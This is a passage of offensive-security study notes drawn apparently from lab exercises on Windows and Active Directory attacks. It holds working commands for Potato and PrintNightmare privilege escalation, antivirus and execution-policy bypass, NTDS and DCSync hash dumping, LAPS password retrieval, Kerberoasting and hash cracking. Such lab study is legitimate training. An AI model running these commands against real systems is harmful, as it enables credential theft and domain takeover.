c:\Users\user> reg query HKLM /f password /t REG_SZ /s
#OR
C:\Users\user> reg query HKCU /f password /t REG_SZ /s
```
  
enum users and their description
```
Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description
```


Common verbs to include

    Get

    Start

    Stop

    Read

    Write

    New

    Out
    

Now that we've understood how cmdlets works - let's explore how to use them! The main thing to remember here is that Get-Command and Get-Help are your best friends!

#### Using Get-Help

Get-Help displays information about a cmdlet. To get help about a particular command, run the following.
```
Get-Help Command-Name
```
You can also understand how exactly to use the command by passing in the -examples flag. This would return output like the following

![image](https://user-images.githubusercontent.com/24814781/184435826-117b6f0d-3e55-4966-9593-2f06b4319014.png)

#### Using Get-Command

Get-Command gets all the cmdlets installed on the current device. The great thing about this cmdlet is that it allows for pattern matching like the following.
```
Get-Command Verb-* 
```
or 
```
Get-Command *-Noun
```

Running the Get-Command New-* to view all the cmdlets for the verb new displays the following.

![image](https://user-images.githubusercontent.com/24814781/184435903-c3dde93d-432c-4a75-95e9-cebb0a0ca20d.png)


#### Object Manipulation

In the previous task, we saw how the output of every cmdlet is an object. If we want to actually manipulate the output, we need to figure out a few things.

    Passing ouput to other cmdlets

    Using specific object cmdlets to extract information

The Pipeline(|) is used to pass output from one cmdlet to another. A major difference compared to other shells is that instead of passing text or string to the command after the pipe, powershell passes an object to the next cmdlet. Like every object in object oriented frameworks, an object will contain methods and properties. You can think of methods as functions that can be applied to output from the cmdlet and you can think of properties as variables in the output from a cmdlet. To view these details, pass the output of a cmdlet to the Get-Member cmdlet.
```
Verb-Noun | Get-Member    
```
An example of running to view the members for Get-Command.
```
Get-Command | Get-Member -MemberType Method    
```
![image](https://user-images.githubusercontent.com/24814781/184436024-fff57cdf-b2c3-49d7-ad25-6d86235ac124.png)

From the above flag in the command, you can see that you can also select between methods and properties.


#### Creating Objects From Previous cmdlets

One way of manipulating objects is pulling out the properties from the output of a cmdlet and creating a new object. This is done using the Select-Object cmdlet.

Here's an example of listing the directories and just selecting the mode and the name.

![image](https://user-images.githubusercontent.com/24814781/184436063-0b9a73f7-9bd5-4ede-a571-654dc59ec00b.png)

You can also use the following flags to select particular information.

first - gets the first x object

last - gets the last x object

unique - shows the unique objects

skip - skips x objects

#### Filtering Objects

When retrieving output objects, you may want to select objects that match a very specific value. You can do this using the Where-Object to filter based on the value of properties.

The general format using this cmdlet is
```
Verb-Noun | Where-Object -Property PropertyName -operator Value
```
```
Verb-Noun | Where-Object {$_.PropertyName -operator Value}
```

The second version uses the $_ operator to iterate through every object passed to the Where-Object cmdlet.

Where -operator is a list of the of the following operators.

    Contains - If any item in the property value is an exact match for the specified value/

    EQ - If the property value is the same as the specified value.

    GT - If the property value is greater than the specified value

For a full list of operators, use this link.
```
https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object?view=powershell-7.2&viewFallbackFrom=powershell-6
```

Here's an example of checking the stopped processes:

![image](https://user-images.githubusercontent.com/24814781/184436240-b3d76a83-3b38-4d76-964d-8e789ad44e43.png)


#### Sort Object

When a cmdlet outputs a lot of information, you may need to sort it to extract the information more efficiently. You do this by pipe lining the output of a cmdlet to the Sort-Object cmdlet.

The format of the command would be 
```
Verb-Noun | Sort-Object
```
Here's an example of sorting the list of directories.

![image](https://user-images.githubusercontent.com/24814781/184436288-d6cf9435-faeb-455c-a19c-36985dfa999f.png)

#### Introduction to Offensive Powershell

Well we have all this information now how can we apply it to attacking a windows network? We can utilize offensive powershell to enumerate and attack Windows and Windows Active Directory.

Basic Offensive Powershell

A majority of offensive Powershell will come from using Modules like ActiveDirectory and PowerView to enumerate and exploit however powershell also has a few cmdlets that you can use to your offensively.

Powershell has the ability to import modules such as ActiveDirectory and PowerView to expand the list of cmdlets available. To import a module you can either use Import-Module <Module> or you can use dot space dot backslash <Module> (. .\Module).

Examples of importing modules
```
Import-Module Module
```
```
. .\Module.ps1    
```
Note: . .\ will only work with powershell script files. All other modules will need to be imported with Import-Module for example ActiveDirectory can only be imported with Import-Module.

#### Get-ADDomain

Get-ADDomain is a commandlet that pulls a large majority of the information about the Domain you’re attacking. It can list all of the Domain Controllers for a given environment, tell you the NetBIOS Domain name, the FQDN (Fully Qualified Domain name) and much more. Using the Select-Object command, we can filter out some of the unnecessary objects that may be displayed (like COntainers, Group Policy Objects, and much more)
```
Get-ADDomain | Select-Object NetBIOSName, DNSRoot, InfrastructureMaster
```
![image](https://user-images.githubusercontent.com/24814781/184438202-37ba4f39-8315-4fa1-8cd0-ac7320a82ae7.png)

#### Get-ADForest

Get-ADForest is another commandlet that pulls all the Domains within a Forest and lists them out to the user. This may be useful if a bidirectional trust is setup, it may allow you to gain a foothold in another domain on the LAN. Just like Get-ADDomain, there is a lot of output, so we will be using Select-Object to trim the output down.
```
Get-ADForest | Select-Object Domains
```
![image](https://user-images.githubusercontent.com/24814781/184438332-af74d157-6002-4ae0-a3c3-235eaa52c849.png)


#### Get-ADTrust 

Get-ADTrust is the last built in Powershell commandlet that we will be discussing, after this, we will move over to Powerview. Get-ADTrust provides a ton of information about the Trusts within the AD Domain. It can tell you if it’s a one way or bidirectional trust, who the source is, who the target is, and much more. One required field is -Filter, this is required in the event that you want to filter on a specific Domain/Trust, if you do not (like in most circumstances), you can simply provide a * to wildcard the results.
```
Get-ADTrust -Filter * | Select-Object Direction,Source,Target
```
![image](https://user-images.githubusercontent.com/24814781/184438764-ed7e7928-4100-419f-91ab-d3fa401a16a1.png)


  

### Get LAPSPasswords
  
Powershell function to pull the local admin passwords from LDAP, stored there by LAPS. 

```
https://github.com/kfosaaen/Get-LAPSPasswords.git
```

### powerup
PowerUp.ps1 is a program that enables a user to perform quick checks against a Windows machine for any privilege escalation opportunities. It is not a comprehensive check against all known privilege escalation techniques, but it is often a good place to start when you are attempting to escalate local privileges.

The script can be downloaded from here as a packet with the powersploit github under the privesc part: 
```
https://github.com/PowerShellMafia/PowerSploit
```
Brief Overview

Here is a brief overview of how to use PowerUp.ps1

1.    Download PowerUp.ps1
2.    Modify the script to bypass anti-virus
3.    Upload the file to the target Windows machine
4.    Disable AMSI and bypass PowerShell Execution Policy
```
powershell -ep bypass
```
5.    Run the program and observe the output
6.    Select the misconfiguration you want to exploit and run the provided command.

how to use it 
```
powershell -ep bypass
. .\powerup.ps
Invoke-AllChecks
```


### sweetpotato
```
https://jlajara.gitlab.io/Potatoes_Windows_Privesc  
```
download exe binary with:
```
wget https://raw.githubusercontent.com/uknowsec/SweetPotato/master/SweetPotato-Webshell-new/bin/Release/SweetPotato.exe
```

Sweet Potato
Sweet Potato is a collection of various native Windows privilege escalation techniques from service accounts to SYSTEM. It has been created by @EthicalChaos and includes:

RottenPotato

Weaponized JuciyPotato with BITS WinRM discovery

PrintSpoofer discovery and original exploit

EfsRpc built on EfsPotato

PetitPotam

It is the definitelly potatoe, a potatoe to rule them all.

Exploitation
Download the binary from the repository: Here
```
https://github.com/CCob/SweetPotato
```
```
./SweetPotato.exe

  -c, --clsid=VALUE          CLSID (default BITS:
                               4991D34B-80A1-4291-83B6-3328366B9097)
  -m, --method=VALUE         Auto,User,Thread (default Auto)
  -p, --prog=VALUE           Program to launch (default cmd.exe)
  -a, --args=VALUE           Arguments for program (default null)
  -e, --exploit=VALUE        Exploit mode
                               [DCOM|WinRM|EfsRpc|PrintSpoofer(default)]
  -l, --listenPort=VALUE     COM server listen port (default 6666)
  -h, --help                 Display this help
```





### JuicyPotato
```
https://jlajara.gitlab.io/Potatoes_Windows_Privesc  
```

Juicy Potato
Juicy Potato is Rotten Potato on steroids. It allows a more flexible way to exploit the vulnerability. In this case, ohpe & decoder during a Windows build review found a setup where BITS was intentionally disabled and port 6666 was taken, therefore Rotten Potato PoC won’t work.

What are BITS and CLSID?
CLSID is a globally unique identifier that identifies a COM class object. It is an identifier like UUID.
Background Intelligent Transfer Service (BITS) is used by programmers and system administrators to download files from or upload files to HTTP web servers and SMB file shares. The point is that BITs implements the IMarshal interface and allows the proxy declaration to force the NTLM Authentication.
Rotten Potato’s PoC used BITS with a default CLSID
```
// Use a known local system service COM server, in this cast BITSv1
Guid clsid = new Guid("4991d34b-80a1-4291-83b6-3328366b9097");
```
They discovered that other than BITS there are several out of process COM servers identified by specific CLSIDs that could be abused. They need al least to:

Be instantiable by the current user, normally a service user which has impersonation privileges
Implement the IMarshal interface
Run as an elevated user (SYSTEM, Administrator, …)
And they found a lot of them: http://ohpe.it/juicy-potato/CLSID/

What are the advantages?
We do not need to have a meterpreter shell
We can specify our COM server listen port
We can specify with CLSID to abuse
Exploitation
Download the binary from the repository: Here
```
https://github.com/ohpe/juicy-potato
```
```
juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
```
Does this still works?
Same case as Rotten potato.

### hotpotato
```
https://jlajara.gitlab.io/Potatoes_Windows_Privesc  
```
Hot Potato
Hot Potato was the first potato and was the code name of a Windows privilege escalation technique discovered by Stephen Breen @breenmachine. This vulnerability affects Windows 7, 8, 10, Server 2008, and Server 2012.

How does this works?
![image](https://user-images.githubusercontent.com/24814781/180617915-894293d4-648b-4d5e-924b-e8ed5c9f39fa.png)
  
Therefore, the vulnerability uses the following:

1. Local NBNS Spoofer: To impersonate the name resolution and force the system to download a malicious WAPD configuration.
2. Fake WPAD Proxy Server: Deploys a malicios WAPD configuration to force the system to perform a NTLM authentication
3. HTTP -> SMB NTLM Relay: Relays the WAPD NTLM token to the SMB service to create an elevated process.

Exploitation
Download the binary from the repository: Here  
```
https://github.com/foxglovesec/Potato
```
```
Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true
```
Is this vulnerability exploitable right now?
Microsoft patched this (MS16-075) by disallowing same-protocol NTLM authentication using a challenge that is already in flight. What this means is that SMB->SMB NTLM relay from one host back to itself will no longer work. MS16-077 WPAD Name Resolution will not use NetBIOS (CVE-2016-3213) and does not send credential when requesting the PAC file(CVE-2016-3236). WAPD MITM Attack is patched.

  
### rottenpotato
```
https://jlajara.gitlab.io/Potatoes_Windows_Privesc  
```

Rotten Potato
Rotten Potato is quite complex, but mainly it uses 3 things:

1. RPC that is running through NT AUTHORITY/SYSTEM that is going to try to authenticate to our local proxy through the CoGetInstanceFromIStorage API Call.
2. RPC in port 135 that is going to be used to reply all the request that the first RPC is performing. It is going to act as a template.
3. AcceptSecurityContext API call to locally impersonate NT AUTHORITY/SYSTEM

![image](https://user-images.githubusercontent.com/24814781/180618032-1a3b4645-5e3b-4339-8859-92cc60d39d08.png)


1. Trick RPC to authenticate to the proxy with the CoGetInstanceFromIStorage API call. In this call the proxy IP/Por t is specified.
2. RPC send a NTLM Negotiate package to the proxy.
3. The proxy relies the NTLM Negotiate to RPC in port 135, to be used as a template. At the same time, a call to AcceptSecurityContext is performed to force a local authentication. Notice that this package is modified to force the local authentication.
4. & 5. RPC 135 and AcceptSecurityContext replies with a NTLM Challenge . The content of both packets are mixed to match a local negotiation and is forwarded to the RPC, step 6..
7. RPC responds with a NLTM Auth package that is send to AcceptSecurityContext (8.) and the impersonation is performed (9.).

 
Exploitation
Download the binary from the repository: Here
```
https://github.com/breenmachine/RottenPotatoNG
```
After having a meterpreter shell with incognito mode loaded:
```
MSFRottenPotato.exe t c:\windows\temp\test.bat
```
Is this vulnerability exploitable right now?
Decoder analyzed if this technique could be exploited in the latest Windows version, in this blog post: https://decoder.cloud/2018/10/29/no-more-rotten-juicy-potato/

To sum up:

DCOM does not talk to our local listeners, so no MITM and no exploit.

Sending the packets to a host under our control listening on port 135, and then forward the data to our local COM listener does not work. The problem is that in this case, the client will not negotiate a Local Authentication.

Therefore, this technique won’t work on versions >= Windows 10 1809 & Windows Server 2019

### lonelypotato
```
https://jlajara.gitlab.io/Potatoes_Windows_Privesc  
```

Lonely Potato
Lonely Potato was the adaptation of Rotten Potato without relying on meterpreter and the “incognito” module made by Decoder.

https://decoder.cloud/2017/12/23/the-lonely-potato/

Is this vulnerability exploitable right now?
Lonely Potato is deprecated and after visiting the repository, there is an indication to move to Juicy Potato.
```
https://github.com/decoder-it/lonelypotato
```
OBS: just switch to juicypotato or something else!

### roguepotato
```
https://jlajara.gitlab.io/Potatoes_Windows_Privesc  
```

Rogue Potato
After reading fixes regarding Rotten/Juicy potato, the following conclusions can be drawn:

You cannot specify a custom port for OXID resolver address in latest Windows versions
If you redirect the OXID resolution requests to a remote server on port 135 under your control and the forward the request to your local Fake RPC server, you will obtain only an ANONYMOUS LOGON.
If you resolve the OXID Resolution request to a fake RPC Server, you will obtain an identification token during the IRemUnkown2 interface query.
How does this works?

![image](https://user-images.githubusercontent.com/24814781/180618225-24ffa2fb-bc31-4262-9929-74d6e9c157a6.png)

Rogue Potato instruct the DCOM server to perform a remote OXID query by specifying a remote IP (Attacker IP)
On the remote IP, setup a “socat” listener for redirecting the OXID resolutions requests to a fake OXID RPC Server
The fake OXID RPC server implements the ResolveOxid2 server procedure, which will point to a controlled Named Pipe [ncacn_np:localhost/pipe/roguepotato[\pipe\epmapper]].
The DCOM server will connect to the RPC server in order to perform the IRemUnkown2 interface call. By connecting to the Named Pipe, an “Autentication Callback” will be performed and we could impersonate the caller via RpcImpersonateClient() call.
Then, a token stealer will:
Get the PID of the rpcss service
Open the process, list all handles and for each handle try to duplicate it and get the handle type
If handle type is “Token” and token owner is SYSTEM, try to impersonate and launch a process with CreatProcessAsUser() or CreateProcessWithToken()

To dig deeper read the author’s blog post: https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/

What do you need to make it work?
You need to have a machine under your control where you can perform the redirect and this machine must be accessible on port 135 by the victim
Upload both exe files from the PoC. In fact it is also possible to launch the fake OXID Resolver in standalone mode on a Windows machine under our control when the victim’s firewall won’t accept incoming connections.
More info: https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html

Exploitation
Download the binary from the repository: Here
```
https://github.com/antonioCoco/RoguePotato
```
Run in your machine the socat redirection (replace VICTIM_IP):
```
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
```
Execute PoC (replace YOUR_IP and command):
```
.\RoguePotato.exe -r YOUR_IP -e "command" -l 9999
```

### genericpotato
```
https://jlajara.gitlab.io/Potatoes_Windows_Privesc  
```

Generic Potato
Wait, another potato? Yes. Generic Potato is a modified version of SweetPotato by @micahvandeusen to support impersonating authentication over HTTP and/or named pipes.

This allows for local privilege escalation from SSRF and/or file writes. It is handy when:

The user we have access to has SeImpersonatePrivilege
The system doesn’t have the print service running which prevents SweetPotato.
WinRM is running preventing RogueWinRM
You don’t have outbound RPC allowed to any machine you control and the BITS service is disabled preventing RoguePotato.
How do we abuse this? All we need is to cause an application or user with higher privileges to authenticate to us over HTTP or write to our named pipe. GenericPotato will steal the token and run a command for us as the user running the web server, probably system. More information ca be found here

Exploitation
Download the binary from the repository: Here
```
https://github.com/micahvandeusen/GenericPotato
```
```
.\GenericPotato.exe

  -m, --method=VALUE         Auto,User,Thread (default Auto)
  -p, --prog=VALUE           Program to launch (default cmd.exe)
  -a, --args=VALUE           Arguments for program (default null)
  -e, --exploit=VALUE        Exploit mode [HTTP|NamedPipe(default)]
  -l, --port=VALUE           HTTP port to listen on (default 8888)
  -i, --host=VALUE           HTTP host to listen on (default 127.0.0.1)
  -h, --help                 Display this help
```

  ## printnightmare 
  CVE-2021-1675
  
  Pure PowerShell implementation of CVE-2021-1675 Print Spooler Local Privilege Escalation (PrintNightmare) 
  
  ```
  https://github.com/calebstewart/CVE-2021-1675
  ```
  
  easy basic example: 
  ```
  Import-Module .\CVE-2021-1675.ps1
  ```
  ```
  Invoke-Nightmare
  ```
  
  and you will get a output like: 
```
  [+] using default new user: adm1n
[+] using default new password: P@ssw0rd
[+] created payload at C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\mxdwdrv.dll"
[+] added user  as local administrator
[+] deleting payload from C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
```

  
Notice that our payload mentions creating a new user called adm1n with a password of P@ssw0rd? This is the default behaviour when using this exploit; however, we could have created our own payload and substituted that in should we have preferred another method of exploitation.
  
We could also take the simple option of right-clicking (if we are in a RDP GUI) on PowerShell or cmd.exe and choosing to "Run as Administrator"
  
We could also use a hacky little PowerShell command to start a new high-integrity command prompt running as our new administrator.
```
Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n
```
  
Run the command "whoami /groups" in the new window. You should see "BUILTIN\Administrators" in the list of groups, and a line at the bottom of the output containing "Mandatory Label\High Mandatory Level".
  

-----------------------------------------------------------------------------------------------------------------------------
### extra tools
The following tools may be worth trying to scan a target machine (files, memory, etc.) for hunting sensitive information. We suggest trying them out in the enumeration stage.

*    Snaffler
```
https://github.com/SnaffCon/Snaffler
```
*    Seatbelt (which we already know further up)
```
https://github.com/GhostPack/Seatbelt
```
*    Lazagne
```
https://www.hackingarticles.in/post-exploitation-on-saved-password-with-lazagne/
```

### local Domain Controller
This task discusses the required steps to dump Domain Controller Hashes locally and remotely.
  
### NTDS Domain Controller
NTDS Domain Controller

New Technologies Directory Services (NTDS) is a database containing all Active Directory data, including objects, attributes, credentials, etc. The NTDS.DTS data consists of three tables as follows:

    Schema table: it contains types of objects and their relationships.
    Link table: it contains the object's attributes and their values.
    Data type: It contains users and groups.

NTDS is located in C:\Windows\NTDS by default, and it is encrypted to prevent data extraction from a target machine. Accessing the NTDS.dit file from the machine running is disallowed since the file is used by Active Directory and is locked. However, there are various ways to gain access to it. This task will discuss how to get a copy of the NTDS file using the ntdsutil and Diskshadow tool and finally how to dump the file's content. It is important to note that decrypting the NTDS file requires a system Boot Key to attempt to decrypt LSA Isolated credentials, which is stored in the SECURITY file system. Therefore, we must also dump the security file containing all required files to decrypt. 
  
### Ntdsutil
Ntdsutil

Ntdsutil is a Windows utility to used manage and maintain Active Directory configurations. It can be used in various scenarios such as 

*    Restore deleted objects in Active Directory.
*    Perform maintenance for the AD database.
*    Active Directory snapshot management.
*    Set Directory Services Restore Mode (DSRM) administrator passwords.

For more information about Ntdsutil, you may visit the Microsoft documentation page
```
https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753343(v=ws.11)
```


### Local Dumping No Credentials
This is usually done if you have no credentials available but have administrator access to the domain controller. Therefore, we will be relying on Windows utilities to dump the NTDS file and crack them offline. As a requirement, first, we assume we have administrator access to a domain controller. 

To successfully dump the content of the NTDS file we need the following files:

*    C:\Windows\NTDS\ntds.dit
*    C:\Windows\System32\config\SYSTEM
*    C:\Windows\System32\config\SECURITY

The following is a one-liner PowerShell command to dump the NTDS file using the Ntdsutil tool in the C:\temp directory.
```
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```
Now, if we check the c:\temp directory, we see two folders: Active Directory and registry, which contain the three files we need. Transfer them to the AttackBox and run the secretsdump.py script to extract the hashes from the dumped memory file.
```    
user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local 
```
  
### Remote Dumping With Credentials
In the previous section, we discussed how to get hashes from memory with no credentials in hand. In this task, we will be showing how to dump a system and domain controller hashes remotely, which requires credentials, such as passwords or NTLM hashes. We also need credentials for users with administrative access to a domain controller or special permissions as discussed in the DC Sync section.

  
### DC Sync
The DC Sync is a popular attack to perform within an Active Directory environment to dump credentials remotely. This attack works when an account (special account with necessary permissions) or AD admin account is compromised that has the following AD permissions:

*    Replicating Directory Changes
*    Replicating Directory Changes All
*    Replicating Directory Changes in Filtered Set

An adversary takes advantage of these configurations to perform domain replication, commonly referred to as "DC Sync", or Domain Controller Sync. 

```     
user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -just-dc THM.red/<AD_Admin_User>@10.10.204.246 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
thm.red\thm:1114:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
```
Let's explain the command a bit more.

*    the -just-dc argument is for extracting the NTDS data.
*    the thm.red/AD_Admin_User is the authenticated domain user in the form of (domain/user).

Note if we are interested to dump only the NTLM hashes, then we can use the -just-dc-ntlm argument as follows,

           
user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -just-dc-ntlm THM.red/<AD_Admin_User>@10.10.204.246


Once we obtained hashes, we can either use the hash for a specific user to impersonate him or crack the hash using Cracking tools, such hashcat. We can use the hashcat -m 1000 mode to crack the Windows NTLM hashes as follows:
```        
user@machine$ hashcat -m 1000 -a 0  /path/to/wordlist/such/as/rockyou.txt
```

### Local Administrator Password Solution LAPS 
This task discusses how to enumerate and obtain a local administrator password within the Active Directory environment if a LAPS feature is configured and enabled.

### Group Policy Preferences GPP
A Windows OS has a built-in Administrator account which can be accessed using a password. Changing passwords in a large Windows environment with many computers is challenging. Therefore, Microsoft implemented a method to change local administrator accounts across workstations using Group Policy Preferences (GPP).

GPP is a tool that allows administrators to create domain policies with embedded credentials. Once the GPP is deployed, different XML files are created in the SYSVOL folder. SYSVOL is an essential component of Active Directory and creates a shared directory on an NTFS volume that all authenticated domain users can access with reading permission.
  
The issue was the GPP relevant XML files contained a password encrypted using AES-256 bit encryption. At that time, the encryption was good enough until Microsoft somehow published its private key on MSDN.
```
https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN
```
Since Domain users can read the content of the SYSVOL folder, it becomes easy to decrypt the stored passwords. One of the tools to crack the SYSVOL encrypted password is Get-GPPPassword.
```
https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
```

### Local Administrator Password Solution LAPS2 
In 2015, Microsoft removed storing the encrypted password in the SYSVOL folder. It introduced the Local Administrator Password Solution (LAPS), which offers a much more secure approach to remotely managing the local administrator password.

The new method includes two new attributes (ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime) of computer objects in the Active Directory. The ms-mcs-AdmPwd attribute contains a clear-text password of the local administrator, while the ms-mcs-AdmPwdExpirationTime contains the expiration time to reset the password. LAPS uses admpwd.dll to change the local administrator password and update the value of ms-mcs-AdmPwd.

![image](https://user-images.githubusercontent.com/24814781/189459047-fcbaceca-d030-49e5-9aff-db282dfaffa2.png)




### Enumerate for LAPS
let's start enumerating it. First, we check if LAPS is installed in the target machine, which can be done by checking the admpwd.dll path.
```
C:\Users\thm>dir "C:\Program Files\LAPS\CSE"
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Program Files\LAPS\CSE

06/06/2022  01:01 PM              .
06/06/2022  01:01 PM              ..
05/05/2021  07:04 AM           184,232 AdmPwd.dll
               1 File(s)        184,232 bytes
               2 Dir(s)  10,306,015,232 bytes free
```
The output confirms that we have LAPS on the machine. Let's check the available commands to use for AdmPwd cmdlets as follows,

```
PS C:\Users\thm> Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS
```

Next, we need to find which AD organizational unit (OU) has the "All extended rights" attribute that deals with LAPS. We will be using the "Find-AdmPwdExtendedRights" cmdlet to provide the right OU. Note that getting the available OUs could be done in the enumeration step. Our OU target in this example is THMorg. You can use the -Identity *  argument to list all available OUs.
```
PS C:\Users\thm> Find-AdmPwdExtendedRights -Identity THMorg

ObjectDN                                      ExtendedRightHolders
--------                                      --------------------
OU=THMorg,DC=thm,DC=red                       {THM\THMGroupReader}
```

The output shows that the THMGroupReader group in THMorg has the right access to LAPS. Let's check the group and its members.

```
PS C:\Users\thm> net groups "THMGroupReader"
Group name     THMGroupReader
Comment

Members

-------------------------------------------------------------------------------
bk-admin
The command completed successfully.

PS C:\Users\victim> net user test-admin
User name                    test-admin
Full Name                    THM Admin Test Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

[** Removed **]
Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
                             *THMGroupReader           *Enterprise Admins
The command completed successfully.
```



### Getting the Password

We found that the bk-admin user is a member of THMGroupReader, so in order to get the LAPS password, we need to compromise or impersonate the bk-admin user. After compromising the right user, we can get the LAPS password using Get-AdmPwdPassword cmdlet by providing the target machine with LAPS enabled.
```
PS C:\> Get-AdmPwdPassword -ComputerName creds-harvestin

ComputerName         DistinguishedName                             Password           ExpirationTimestamp
------------         -----------------                             --------           -------------------
CREDS-HARVESTIN      CN=CREDS-HARVESTIN,OU=THMorg,DC=thm,DC=red    FakePassword    2/11/2338 11:05:2...
```

It is important to note that in a real-world AD environment, the LAPS is enabled on specific machines only. Thus, you need to enumerate and find the right target computer as well as the right user account to be able to get the LAPS password. There are many scripts to help with this, but we included the LAPSToolkit
```
https://github.com/leoloobeek/LAPSToolkit
```


### AD Kerberoasting
Kerberoasting is a common AD attack to obtain AD tickets that helps with persistence. In order for this attack to work, an adversary must have access to SPN (Service Principal Name) accounts such as IIS User, MSSQL, etc. The Kerberoasting attack involves requesting a Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS). This attack's end goal is to enable privilege escalation and lateral network movement. 

Let's do a quick demo about the attack. First, we need to find an SPN account(s), and then we can send a request to get a TGS ticket. We will perform the Kerberoasting attack from the AttackBox using the GetUserSPNs.py python script. Remember to use the THM.red/thm account with Passw0rd! as a password.
```       
user@machine$ python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.204.246 THM.red/thm
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation
----------------------------  -------  --------  --------------------------  ---------  ----------
http/creds-harvestin.thm.red  svc-user            2022-06-04 00:15:18.413578  

```

The previous command is straightforward: we provide the Domain Controller IP address and the domain name\username. Then the GetUserSPNs script asks for the user's password to retrieve the required information.

The output revealed that we have an SPN account, svc-user. Once we find the SPN user, we can send a single request to get a TGS ticket for the srv-user user using the -request-user argument.

```  
user@machine$ python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.204.246 THM.red/thm -request-user svc-user 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation
----------------------------  -------  --------  --------------------------  ---------  ----------
http/creds-harvestin.thm.red  svc-user            2022-06-04 00:15:18.413578  

[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc-user$THM.RED$THM.red/svc-user*$8f5de4211da1cd5715217[*REMOVED*]7bfa3680658dd9812ac061c5
```

Now, it is a matter of cracking the obtained TGS ticket using the HashCat tool using -m 13100 mode as follows,

```
user@machine$ hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
```

### AS REP Roasting
AS-REP Roasting is the technique that enables the attacker to retrieve password hashes for AD users whose account options have been set to "Do not require Kerberos pre-authentication". This option relies on the old Kerberos authentication protocol, which allows authentication without a password. Once we obtain the hashes, we can try to crack it offline, and finally, if it is crackable, we got a password!

![image](https://user-images.githubusercontent.com/24814781/189459934-93f8c0c1-2bfe-49fe-8597-7ad72998219e.png)

The attached VM has one of the AD users configured with the "Do not require Kerberos preauthentication" setting. Before performing the AS-REP Roasting, we need a list of domain accounts that should be gathered from the enumeration step. In our case, we created a users.lst list in the tmp directory. The following is the content of our list, which should be gathered during the enumeration process.

```
Administrator
admin
thm
test
sshd
victim
CREDS-HARVESTIN$
```
We will be using the Impacket Get-NPUsers script this time as follows,

```     
root@machine$ python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.204.246 thm.red/ -usersfile /tmp/users.txt
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User thm doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$victim@THM.RED:166c95418fb9dc495789fe9[**REMOVED**]1e8d2ef27$6a0e13abb5c99c07
[-] User admin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bk-admin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-user doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User thm-local doesn't have UF_DONT_REQUIRE_PREAUTH set
```

We specified the IP address of the domain controller with the -dc-ip argument and provided a list of domain users to check against. Once the tool finds the right user with no preauthentication configuration, it will generate the ticket.

Various cybersecurity and hacking tools also allow cracking the TGTs harvested from Active Directory, including Rubeus and Hashcat. Impacket GetNPUsers has the option to export tickets as John or hashcat format using the -format argument.

### SMB Relay Attack
